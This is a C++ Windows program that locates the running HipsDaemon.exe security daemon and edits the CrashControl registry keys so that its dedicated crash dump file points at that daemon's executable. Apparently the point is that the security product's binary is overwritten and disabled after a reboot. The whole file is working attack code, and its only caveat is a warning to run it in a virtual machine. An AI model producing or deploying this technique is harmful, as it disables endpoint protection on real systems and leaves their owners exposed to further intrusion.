#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>

class AutoHandle {
public:
    AutoHandle() : _h(NULL) {}
    explicit AutoHandle(HANDLE h) : _h(h) {}

    ~AutoHandle() {
        if (_h) {
            CloseHandle(_h);
        }
    }

    HANDLE get() const {
        return _h;
    }

    HANDLE* getptr() {
        return &_h;
    }
 
    void set(HANDLE h) {
        if (_h) {
            CloseHandle(_h);
        }
        _h = h;
    }

    explicit operator bool() const {
        return _h != NULL && _h != INVALID_HANDLE_VALUE;
    }

private:
    HANDLE _h;
};

static BOOL GetProcessPathByNameW(LPCWSTR processName, LPWSTR processPath, DWORD cchBufferSize){
    AutoHandle hProcessSnap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (!hProcessSnap) {
        return FALSE;
    }

    PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32) };
    if (!Process32FirstW(hProcessSnap.get(), &pe32)) {
        return FALSE;
    }

    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            AutoHandle hProc(OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID));
            if (hProc) {
                /*
                注意句柄权限问题
                Windows 10 及更高版本、Windows Server 2016 及更高版本：如果 hModule 参数为 NULL，则句柄只需要 PROCESS_QUERY_LIMITED_INFORMATION 访问权限。
                否则就需要 PROCESS_QUERY_INFORMATION | PROCESS_VM_READ 权限
                */
                if (K32GetModuleFileNameExW(hProc.get(), NULL, processPath, cchBufferSize)) {
                    return TRUE;
                }
            }
        }
    } while (Process32NextW(hProcessSnap.get(), &pe32));

    return FALSE;
}

int main() {
    wprintf(L"[W] This program may damage your system, please run this program under a virtual machine!\n");
    system("pause > nul");

    LPCWSTR targetProcess = L"HipsDaemon.exe";
    wprintf(L"[i] Target process: %s\n", targetProcess);

    WCHAR targetProcessPath[MAX_PATH * 2] = {};
    if (!GetProcessPathByNameW(targetProcess, targetProcessPath, MAX_PATH)) {
        wprintf(L"[E] Unable to get target process path\n");
        return 1;
    }

    wprintf(L"[i] Target process path: %s\n", targetProcessPath);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Control\\CrashControl", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        wprintf(L"[E] Unable to open registry\n");
        return 1;
    }
    
    DWORD enableCrachDump = 0x7;
    if (RegSetValueExW(hKey, L"CrashDumpEnabled", 0, REG_DWORD, (const BYTE*)&enableCrachDump, sizeof(enableCrachDump)) != ERROR_SUCCESS) {
        wprintf(L"[E] Unable to enable crash dump\n");
        return 1;
    }
    
    DWORD dumpSize = 0x1;
    if (RegSetValueExW(hKey, L"DumpFileSize", 0, REG_DWORD, (const BYTE*)&dumpSize, sizeof(dumpSize)) != ERROR_SUCCESS) {
        wprintf(L"[E] Unable to set dump size\n");
        return 1;
    }
    
    if (RegSetValueExW(hKey, L"DedicatedDumpFile", 0, REG_SZ, (const BYTE*)targetProcessPath, wcslen(targetProcessPath) * 2) != ERROR_SUCCESS) {
        wprintf(L"[E] Unable to set dump file\n");
        return 1;
    }

    wprintf(L"[S] Done, just restart your computer\n");

    return 0;
}
